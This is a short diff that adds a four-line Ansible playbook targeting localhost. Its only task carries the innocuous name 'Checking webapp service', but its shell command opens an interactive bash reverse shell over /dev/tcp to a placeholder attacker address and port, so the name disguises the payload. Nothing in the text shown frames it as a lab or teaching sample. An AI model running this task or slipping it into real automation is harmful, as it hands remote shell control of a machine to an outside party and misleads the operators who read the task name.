@@ -1,0 +1,4 @@
+- hosts: localhost
+  tasks:
+  - name: Checking webapp service
+    shell: bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
